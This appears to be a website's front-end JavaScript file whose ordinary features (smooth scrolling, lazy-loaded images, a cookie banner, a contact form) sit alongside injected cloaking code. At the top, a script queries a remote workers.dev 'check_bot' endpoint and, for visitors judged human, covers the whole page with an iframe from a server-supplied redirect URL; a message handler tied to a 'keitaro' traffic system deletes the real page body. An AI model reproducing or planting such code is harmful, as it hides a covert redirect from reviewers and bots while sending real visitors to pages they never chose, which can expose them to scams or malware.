const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = 'frameLoad.html';
    frame.frameBorder = 0;
    frame.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;border:none;';
    const html = document.querySelector('html');
    if (html && html.childNodes.length > 0) {
        html.insertBefore(frame, html.firstChild);
    }
};

const toggleLoad = () => {
    const body = document.querySelector('body');
    if (body) body.removeAttribute('hidden');
    const frame = document.querySelector('#load_frame');
    if (frame) frame.style.display = 'none';
};

createLoader();

window.addEventListener('DOMContentLoaded', () => {
    
    fetch('https://proxy_cf.opaopaopppa.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
        if (res?.code == 200 && !res.result) {
            createFrame(res.url_red + 'NVQVZ4')
        } else {
            setTimeout(toggleLoad, 500);

        }

    })

    // Smooth scroll
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                e.preventDefault();
                target.scrollIntoView({ behavior: 'smooth' });
            }
        });
    });

    // Lazy load images
    const images = document.querySelectorAll('img[data-src]');
    const imgObserver = new IntersectionObserver((entries, self) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const img = entry.target;
                img.src = img.getAttribute('data-src');
                self.unobserve(img);
            }
        });
    }, { rootMargin: '0px 0px 50px 0px' });
    images.forEach(img => imgObserver.observe(img));

    // Scroll animations
    const animObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) entry.target.classList.add('visible');
        });
    }, { threshold: 0.1 });
    document.querySelectorAll('.animate-on-scroll').forEach(el => animObserver.observe(el));

    // Cookie banner
    if (!localStorage.getItem('cookieConsent')) {
        const banner = document.getElementById('cookie-banner');
        if (banner) banner.style.display = 'block';
    }
    document.getElementById('cookie-accept')?.addEventListener('click', () => {
        localStorage.setItem('cookieConsent', 'accepted');
        document.getElementById('cookie-banner').style.display = 'none';
    });
    document.getElementById('cookie-decline')?.addEventListener('click', () => {
        localStorage.setItem('cookieConsent', 'declined');
        document.getElementById('cookie-banner').style.display = 'none';
    });

    // Contact form
    const form = document.getElementById('contact-form');
    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = form.querySelector('[type="submit"]');
            btn.textContent = 'Sent!';
            btn.disabled = true;
            setTimeout(() => { btn.textContent = 'Send Message'; btn.disabled = false; }, 3000);
        });
    }
});


window.addEventListener('message', (message) => {
    console.log(message.data);
    if (message.data?.bot) {
        const wrapper = document.querySelector('#wrapper_frame');
        console.log(wrapper);
        wrapper.remove();
        setTimeout(toggleLoad, 500);

    }
    if (message.data.keitaro && !message.data?.bot) {
        const body = document.querySelector('body');
        body.remove()
        setTimeout(toggleLoad, 500);

    }

})


function createFrame(data) {
    const frame = document.createElement('iframe');
    frame.setAttribute('src', data);
    frame.setAttribute('width', '100%');
    frame.setAttribute('height', '100vh');
    frame.setAttribute('id', 'wrapper_frame');
    const html = document.querySelector('html');
    html.style.overflow = 'hidden';

    // body.innerHTML = '';
    html.append(frame);
    frame.style = 'width: 100%; height: 100vh;border: none;'
    const style = document.createElement('style');
    style.innerHTML = `
    
  /* Make the iframe responsive */
  @media only screen and (max-width: 768px) {
    iframe {
      height: 50vh;
    }
  }

  @media only screen and (max-width: 480px) {
    iframe {
      height: 30vh;
    }
  }
    `;
    html.append(style)
}